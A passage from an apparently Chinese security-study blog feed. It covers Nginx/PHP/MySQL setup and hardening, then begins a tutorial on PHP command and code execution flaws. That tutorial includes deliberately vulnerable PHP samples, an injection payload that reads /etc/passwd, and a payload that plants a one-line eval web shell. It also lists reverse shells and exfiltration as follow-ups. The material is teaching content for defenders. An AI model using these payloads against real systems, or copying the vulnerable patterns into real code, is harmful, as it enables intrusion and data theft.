<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">        index index.php index.html index.htm index.nginx-debian.html;</span><br><span class="line">        server_name SERVER_IP_ADDRESS;</span><br><span class="line"></span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">                try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">                include snippets&#x2F;fastcgi-php.conf;</span><br><span class="line">                fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ &#x2F;\.ht &#123;</span><br><span class="line">                deny all;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意两个地方：</p>
<ul>
<li>在<code>index.html</code>前面添加<code>index.php</code></li>
<li>确保<code>fastcgi_pass</code> 套接字路径是正确的</li>
</ul>
<p>添加此内容后，保存并关闭该文件。通过从新服务器块配置文件（在<code>/etc/nginx/sites-available/</code>目录中）到<code>/etc/nginx/sites-enabled/</code>目录创建符号链接来启用新服务器块：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/</span><br></pre></td></tr></table></figure>
<p>然后，从<code>/sites-enabled/</code>目录中取消链接默认配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo unlink /etc/nginx/sites-enabled/default</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>注意</strong>：如果您需要恢复默认配置，可以通过重新创建符号链接来执行此操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo ln -s /etc/nginx/sites-available/default /etc/nginx/sites-enabled/</span><br></pre></td></tr></table></figure>
</blockquote>
<p>以下命令可以测试新配置文件的语法错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo nginx -t</span><br></pre></td></tr></table></figure>
<p>准备好后，重新加载Nginx的配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl reload nginx</span><br></pre></td></tr></table></figure>
</li>
<li>
<h5 id="Create-a-PHP-file-to-Test-Configuration">Create a PHP file to Test Configuration</h5>
<p>在<code>/var/www/html/</code>下新建<code>info.php</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vim /var/www/html/info.php</span><br></pre></td></tr></table></figure>
<p>在新文件中写入以下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure>
<p>现在可以在浏览器中访问<code>http://Server_IP_Address/info.php/</code>，应该看到PHP生成的网页，其中包含有关您的服务器的信息：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5jbfupowxj20py0ekgmy.jpg" alt=""></p>
</li>
</ol>
<h3 id="验证结果">验证结果</h3>
<ol>
<li>
<h5 id="Connect-MySQL">Connect MySQL</h5>
<p>在<code>/var/www/html/</code>建立一个新文件<code>test_sql.php</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;username&quot;</span>;</span><br><span class="line">$password = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5jc5mudu3j20ev049weg.jpg" alt=""></p>
</li>
<li>
<h5 id="Create-Database">Create Database</h5>
<p>在上一个步骤的基础上，修改<code>test_sql.php</code>文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;username&quot;</span>;</span><br><span class="line">$password = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建数据库</span></span><br><span class="line">$sql = <span class="string">&quot;CREATE DATABASE testPHP&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;query($sql) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . $conn-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$conn-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5jc8g0seej20ff04k0sq.jpg" alt=""></p>
</li>
<li>
<h5 id="Create-Table">Create Table</h5>
<p>在上一个步骤的基础上，继续修改<code>test_sql.php</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;testPHP&quot;</span>;</span><br><span class="line"> </span><br><span class="line">// 创建连接</span><br><span class="line"><span class="variable">$conn</span> = new mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">// 检测连接</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    die(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">// 使用 sql 创建数据表</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE VIPMembers (</span></span><br><span class="line"><span class="string">id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, </span></span><br><span class="line"><span class="string">firstname VARCHAR(30) NOT NULL,</span></span><br><span class="line"><span class="string">lastname VARCHAR(30) NOT NULL,</span></span><br><span class="line"><span class="string">email VARCHAR(50),</span></span><br><span class="line"><span class="string">reg_date TIMESTAMP</span></span><br><span class="line"><span class="string">)&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>) === TRUE) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Table MyGuests created successfully&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;创建数据表错误: &quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$conn</span>-&gt;close();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5jcuu2hgoj20h004m0sq.jpg" alt=""></p>
</li>
<li>
<h5 id="Insert-Record">Insert Record</h5>
<p>在上一个步骤的基础上，继续修改<code>test_sql.php</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;myDB&quot;</span>;</span><br><span class="line"> </span><br><span class="line">// 创建连接</span><br><span class="line"><span class="variable">$conn</span> = new mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">// 检测连接</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    die(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO MyGuests (firstname, lastname, email)</span></span><br><span class="line"><span class="string">VALUES (&#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;john@example.com&#x27;)&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>) === TRUE) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;新记录插入成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$conn</span>-&gt;close();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5jcz3rcwcj20i304kweh.jpg" alt=""></p>
</li>
</ol>
<h2 id="服务器加固">服务器加固</h2>
<p>本章主要目的是介绍如何通过优化 Nginx 默认配置，提高 Nginx Web 服务器的安全性。其中注释带有<code>ADD</code>是相对于默认配置的新增项。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user www-data;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line">include /etc/nginx/modules-enabled/*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">	worker_connections 768;</span><br><span class="line">	<span class="comment"># multi_accept on;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># Basic Settings</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	sendfile on;</span><br><span class="line">	tcp_nopush on;</span><br><span class="line">	tcp_nodelay on;</span><br><span class="line">	keepalive_timeout 65;</span><br><span class="line">	types_hash_max_size 2048;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># 隐藏Nginx版本号</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	server_tokens off;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># ADD: 通过关闭慢连接来抵御一些DDOS攻击</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">    <span class="comment"># 读取客户端请求体的超时时间</span></span><br><span class="line">    client_body_timeout 5s; </span><br><span class="line">    <span class="comment"># 读取客户端请求头的超时时间</span></span><br><span class="line">    client_header_timeout 5s;</span><br><span class="line">    <span class="comment"># 超时时间之后会关闭这个连接</span></span><br><span class="line">    keepalive_timeout 75s;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment"># ADD: </span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment"># 客户端请求的http头部缓冲区大小</span></span><br><span class="line">    client_header_buffer_size 2k;</span><br><span class="line">    <span class="comment"># 客户端请求的一些比较大的头文件到缓冲区的最大值</span></span><br><span class="line">    large_client_header_buffers 4 4k;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment"># ADD: 防止恶意流量的短时间大量请求</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment"># 用户的IP地址$binary_remote_addr作为Key，每个IP地址每秒处理10个请求</span></span><br><span class="line">    limit_req_zone <span class="variable">$binary_remote_addr</span> zone=ConnLimitZone:10m rate=10r/s;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># server_names_hash_bucket_size 64;</span></span><br><span class="line">	<span class="comment"># server_name_in_redirect off;</span></span><br><span class="line"></span><br><span class="line">	include /etc/nginx/mime.types;</span><br><span class="line">	default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># SSL Settings</span></span><br><span class="line">	<span class="comment"># ADD: 要让https和http并存，不能在配置文件中使用ssl on</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE</span></span><br><span class="line">	<span class="comment"># ssl_prefer_server_ciphers on;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># Logging Settings</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	access_log /var/<span class="built_in">log</span>/nginx/access.log;</span><br><span class="line">	error_log /var/<span class="built_in">log</span>/nginx/error.log;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># Gzip Settings</span></span><br><span class="line">	<span class="comment"># ADD: 开启gzip提高页面加载速度</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	gzip on;</span><br><span class="line"></span><br><span class="line">	gzip_vary on;</span><br><span class="line">	gzip_proxied any;</span><br><span class="line">	gzip_comp_level 6;</span><br><span class="line">	gzip_buffers 16 8k;</span><br><span class="line">	gzip_http_version 1.1;</span><br><span class="line">	gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># Virtual Host Configs</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	include /etc/nginx/conf.d/*.conf;</span><br><span class="line">	include /etc/nginx/sites-enabled/*;</span><br><span class="line">	</span><br><span class="line">	server &#123;</span><br><span class="line">		server_name localhost;</span><br><span class="line">		listen 80;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">##</span></span><br><span class="line">		<span class="comment"># ADD: 清除不安全的HTTP响应头</span></span><br><span class="line">		<span class="comment">##</span></span><br><span class="line">        more_clear_headers <span class="string">&quot;X-Powered-By&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;Server&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;ETag&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;Connection&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;Date&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;Accept-Ranges&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;Last-Modified&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># ADD: 避免点击劫持</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        add_header X-Frame-Options <span class="string">&quot;SAMEORIGIN&quot;</span>; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># ADD: 防XSS攻击</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        add_header X-XSS-Protection <span class="string">&quot;1; mode=block&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># ADD: 禁用不安全的HTTP方法</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$request_method</span> !~ ^(GET|HEAD|POST)$ ) &#123;</span><br><span class="line">            <span class="built_in">return</span> 405;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># ADD: 静态资源</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        location ~* \.(js|css|flash|media|jpg|png|gif|dll|cab|CAB|ico|vbs|json|ttf|woff|eot|map)$ &#123;</span><br><span class="line">            <span class="comment"># 缓存30天</span></span><br><span class="line">            add_header Cache-Control <span class="string">&quot;max-age=2592000&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">## </span></span><br><span class="line">        <span class="comment"># ADD: 静态页面</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        location ~* \.html$ &#123;</span><br><span class="line">            <span class="comment"># 不缓存</span></span><br><span class="line">            add_header Cache-Control <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#mail &#123;</span></span><br><span class="line"><span class="comment">#	# See sample authentication script at:</span></span><br><span class="line"><span class="comment">#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#	# auth_http localhost/auth.php;</span></span><br><span class="line"><span class="comment">#	# pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span></span><br><span class="line"><span class="comment">#	# imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#	server &#123;</span></span><br><span class="line"><span class="comment">#		listen     localhost:110;</span></span><br><span class="line"><span class="comment">#		protocol   pop3;</span></span><br><span class="line"><span class="comment">#		proxy      on;</span></span><br><span class="line"><span class="comment">#	&#125;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#	server &#123;</span></span><br><span class="line"><span class="comment">#		listen     localhost:143;</span></span><br><span class="line"><span class="comment">#		protocol   imap;</span></span><br><span class="line"><span class="comment">#		proxy      on;</span></span><br><span class="line"><span class="comment">#	&#125;</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>Summary</strong>：</p>
<p>在写这篇学习文档之前，我对Nginx服务器安全加固还是处于完全无知的状态，看到参考资料的一些配置都有些云里雾里，但是我又比较喜欢“折腾”，每个阶段成功后都会对虚拟机进行快照，防止环境无法恢复。从上面可以看到，通过修改Nginx的默认配置，可以对Nginx服务器的“先天性”缺陷进行主动防御，比如：关闭版本信息、关闭慢连接、设置静态资源和静态页面的缓存时间等等，这样就可以整体上防止服务器受到常见的攻击。</p>
<p>另外，还可以添加IP白名单和IP黑名单，以及设置Naxsi自定义规则。</p>
<h2 id="Q-A">Q&amp;A</h2>
<ol>
<li>
<p>Nginx中<code>sites-available</code>和<code>sites-enabled</code>的区别</p>
<p>sites-available是存放当前的server配置, 在这里修改配置文件；</p>
<p>sites-enabled是激活并使用的server配置（从sites_available的文件创建快捷方式到sites-enabled）</p>
</li>
<li>
<p><code>ln -s</code>命令</p>
<p><a href="https://www.jianshu.com/p/f7746b7fdf8d">具体使用方法</a></p>
</li>
<li>
<p>Nginx服务器安全加固参考文档</p>
<ul>
<li><a href="https://www.cnblogs.com/RiwellAckerman/p/11273705.html">https://www.cnblogs.com/RiwellAckerman/p/11273705.html</a></li>
<li><a href="https://my.oschina.net/jiaoyanli/blog/1510174">https://my.oschina.net/jiaoyanli/blog/1510174</a></li>
<li><a href="https://blog.csdn.net/JY_He/article/details/52299884">https://blog.csdn.net/JY_He/article/details/52299884</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-36091-1-1.html">https://bbs.ichunqiu.com/thread-36091-1-1.html</a></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>MySQL</tag>
        <tag>LEMP</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全基础学习之命令执行漏洞利用</title>
    <url>/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Web安全基础学习之命令执行漏洞利用">Web安全基础学习之命令执行漏洞利用</h1>
<h2 id="命令执行漏洞的原理">命令执行漏洞的原理</h2>
<p>应用程序有时需要调用一些执行系统命令的函数，比如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_open等函数可以执行系统命令。举个例子来说：后台代码这么写<code>&lt;?php system($_GET['cmd']); ?&gt;</code>，这里的cmd参数用户是可以控制的，那么我们就可以发送请求<code>http://example.com/?cmd=ls</code>来执行系统命令。</p>
<blockquote>
<p>很多人喜欢把代码执行漏洞称为命令执行漏洞，因为命令执行漏洞可以执行系统命令，而代码执行漏洞也会执行系统命令，这样就比较容易混淆。它们之间的区别是：命令执行漏洞是直接调用操作系统命令，而代码执行漏洞则是靠执行代码脚本调用操作系统命令，比如：<code>eval(system('set'))</code></p>
</blockquote>
<h2 id="命令执行漏洞的利用">命令执行漏洞的利用</h2>
<p>利用条件：</p>
<ol>
<li>代码中存在调用系统命令的函数，如exec、system等；</li>
<li>函数中存在我们可控的参数；</li>
<li>可控参数没有过滤或者过滤不严格。</li>
</ol>
<p>比如下面的PHP代码段：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$uri = $request[<span class="string">&#x27;uri&#x27;</span>];</span><br><span class="line">$from = $request[<span class="string">&#x27;from&#x27;</span>];</span><br><span class="line">$to = $request[<span class="string">&#x27;to&#x27;</span>];</span><br><span class="line">$tmp = <span class="string">&#x27;/tmp/act_css_tmp_&#x27;</span>. $uri;</span><br><span class="line">system(<span class="string">&#x27;/usr/bin/wget $from -O $tmp&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>$request</code>变量来自用户URL的输入，最终进入到system函数里作为命令来执行，但是这段代码没有过滤用户的输入，所以可以通过如下的输入来利用命令执行漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cmd&#x3D;1190&amp;func&#x3D;sync_css&amp;uri&#x3D;hi&amp;from&#x3D;;cat &#x2F;etc&#x2F;passwd;&amp;to&#x3D;hi&amp;1&#x3D;2</span><br></pre></td></tr></table></figure>
<p>命令执行漏洞可以有如下的利用：</p>
<ol>
<li>存在回显的话，可以直接读入各种配置文件，密码文件，数据库连接文件等等；</li>
<li>不存在回显的时候，可以使用时间延迟推断，类似盲注的方法。通过一些命令的延时作用来判断漏洞的存在，例如ping命令；</li>
<li>不能在浏览器直接看到回显，可将命令重定向到当前目录下的文件中并查看。或者用TFTP上传工具到服务器，用telnet和netcat建立反向shell，用mail通过SMTP发送结果；</li>
<li>查看自己的权限，可以提升权限，访问敏感数据或控制服务器。</li>
</ol>
<h3 id="命令执行漏洞可利用的函数">命令执行漏洞可利用的函数</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">pcntl_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">反引号</span><br></pre></td></tr></table></figure>
<h4 id="反引号">反引号</h4>
<p>反引用的本质就是在操作系统执行该命令，此时可以造成命令注入等各种危害。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]<span class="comment"># echo ls</span></span><br><span class="line">ls</span><br><span class="line">[root@ca0y1h-centos ~]<span class="comment"># `echo ls`</span></span><br><span class="line">vulhub-master</span><br><span class="line">[root@ca0y1h-centos ~]<span class="comment"># ls</span></span><br><span class="line">vulhub-master</span><br></pre></td></tr></table></figure>
<h4 id="exec-shell-exec-passthru">exec()/shell_exec()/passthru()</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</span><br><span class="line"></span><br><span class="line">string shell_exec ( string $cmd )</span><br><span class="line"></span><br><span class="line">string escapeshellcmd ( string $command )</span><br><span class="line"></span><br><span class="line">void passthru ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
<p>这几个就不细说的，读名字都知道是执行shell命令,如果函数执行未过滤完善的可控参数，可以执行系统命令。</p>
<h4 id="popen-proc-open-pcntl-exec">popen()/proc_open()/pcntl_exec()</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br><span class="line"></span><br><span class="line">resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )</span><br><span class="line"></span><br><span class="line">void pcntl_exec ( string $path [, array $args [, array $envs ]] )</span><br></pre></td></tr></table></figure>
<p>其中popen()和proc_open()是不会直接返回执行结果的，而是返回一个文件指针，但是命令是已经执行了</p>
<h3 id="代码执行漏洞可利用的函数">代码执行漏洞可利用的函数</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval()</span><br><span class="line"></span><br><span class="line">assert()</span><br><span class="line"></span><br><span class="line">preg_replace()</span><br><span class="line"></span><br><span class="line">create_function()</span><br><span class="line"></span><br><span class="line">call_user_func()</span><br><span class="line"></span><br><span class="line">ob_start()</span><br></pre></td></tr></table></figure>
<h4 id="eval-函数">eval()函数</h4>
<p>eval() 函数把字符串按照 PHP 代码来计算。<br>
该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>
如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
<p>比如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $str = @(<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$str=&#x27;</span><span class="string">&quot;.addslashes(<span class="subst">$str</span>).&quot;</span><span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?str&#x3D;$&#123;$&#123;phpinfo();&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>那么根据上面绕过过滤的方式我们就可以这样写入一句话代码了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?str&#x3D;$&#123;$&#123;fputs(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php @eval(\$_POST[&#39;test&#39;])?&gt;&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="assert-函数">assert()函数</h4>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">	assert($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo();</span><br><span class="line">或</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>eval()和assert()区别<br>
eval()函数正确执行需要满足php的代码规范，而assert()函数则不存在这个问题，对于php的代码规范要求不高</p>
</blockquote>
<h4 id="preg-replace-函数">preg_replace()函数</h4>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    preg_replace(<span class="string">&quot;//e&quot;</span>, $GET[<span class="string">&#x27;test&#x27;</span>], <span class="string">&quot;test...&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当replacement 参数构成一个合理的php 代码字符串的时候，/e 修正符使preg_replace()，将replacement 参数当做php 代码执行。</p>
<blockquote>
<p>案例：<a href="http://www.exploit-db.com/exploits/35183/">X7 Chat 2.0.5 preg_replace() PHP Code Execution</a></p>
</blockquote>
<h4 id="create-function-函数">create_function()函数</h4>
<p>在php 中使用create_function()创建一个匿名函数（lambda-style）,如果对参数未进行严格的过滤审查，攻击者可以通过提交特殊字符串给create_function()从而导致任意代码执行。</p>
<p>示例代码：</p>
